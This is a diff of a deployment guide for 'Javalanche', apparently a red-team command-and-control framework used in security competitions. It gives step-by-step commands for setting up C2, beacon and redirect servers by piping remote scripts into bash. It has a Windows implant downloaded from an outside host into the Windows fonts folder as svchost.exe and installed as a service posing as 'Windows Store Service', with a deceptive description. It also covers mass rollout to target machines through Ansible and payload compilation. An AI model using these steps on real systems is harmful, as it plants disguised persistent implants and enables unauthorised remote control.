@@ -1,43 +1,20 @@
-To The following file contains documentation to manually deploy the agent, proxy server, or C2 server on both Windows and Linux.
-
-Linux Redirect Server
-
-$ sudo apt update
-$ sudo apt upgrade -y
-$ sudo apt install curl -y
-$ sudo curl -o serverSetup.sh https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/redirectServerSetup.sh?ref_type=heads
-$ sudo chmod +x serverSetup.sh
-$ sudo ./serverSetup.sh
-
+The following file contains documentation to manually deploy the agent, proxy server, or C2 server on both Windows and Linux.
 
 Linux C2 Server
 
-$ sudo apt update
-$ sudo apt upgrade -y
-$ sudo apt install curl tmux -y
-$ sudo mkdir /home/javalanche
-$ cd /home/javalanche
-$ sudo curl -L -o serverSetup.sh http://javalanche.net/linuxServerSetup
-$ sudo chmod +x serverSetup.sh
-$ tmux new -s c2
-$ sudo ./serverSetup.sh
+$ curl https://javalanche.net/install.sh | bash
+$ javalanche C2
 
 
-Linux Long Range Beacon Server
+Linux Beacon Server
 
-$ sudo apt update
-$ sudo apt install curl tmux -y
-$ sudo mkdir /home/javalanche
-$ cd /home/javalanche
-$ sudo curl -L -o serverSetup.sh http://javalanche.net/linuxServerSetup
-$ sudo chmod +x serverSetup.sh
-$ tmux new -s c2
-$ sudo ./serverSetup.sh -server Beacon
+$ curl https://javalanche.net/install.sh | bash
+$ javalanche Beacon
 
 
 Windows Payload
 
-ps> wget -o C:\Windows\fonts\svchost.exe http://javalanche.net/windowsPayload
+ps> wget -o C:\Windows\fonts\svchost.exe https://javalanche.net/windowsPayload
 ps> New-Service -name 'Windows Store Service' -BinaryPathName 'C:\Windows\fonts\svchost.exe' -DisplayName 'Windows Store Service' -Description 'This Service Assists the Windows Store. If this service is stopped, many core windows features will not work correctly' -Startuptype Automatic
 ps> Start-Service -name 'Windows Store Service'
 
@@ -54,18 +31,14 @@ $ sudo systemctl daemon-reload
 $ sudo systemctl enable firewall
 $ sudo systemctl start firewall
 
+Linux Redirect Server
 
-Windows C2 Server
-
-ps> wget -o setup.ps1 "http://javalanche.net/windowsServerSetup"
-ps> .\setup.ps1
-
-
-Windows Long Range Beacon Server
-
-ps> wget -o setup.ps1 "http://javalanche.net/windowsServerSetup"
-ps> .\setup.ps1 -server Beacon
-
+$ sudo apt update
+$ sudo apt upgrade -y
+$ sudo apt install curl -y
+$ sudo curl -o serverSetup.sh https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/redirectServerSetup.sh?ref_type=heads
+$ sudo chmod +x serverSetup.sh
+$ sudo ./serverSetup.sh
 
 Ansible Payload deployement
 Prerequisites: A Linux machine with SSH access to all linux competition mahcines, and winrm access to all windows compeitition machines
@@ -83,3 +56,9 @@ You will have to edit the hosts: line in the playbook to reflect the group of ho
 If you are not given an inventory.yml file, you will need to edit the existing inventory.yml 
 file to include the proper hosts, usernames, and passwords
 $ ansible-playbook -i inventory/inventory.yml playbook.yml -deploy
+
+Compiling payloads
+Linux
+GOOS=linux GOARCH=amd64 go build -ldflags '-linkmode external -extldflags "-static"' -o linux  main.go
+Windows
+GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w" -o windows.exe main.go
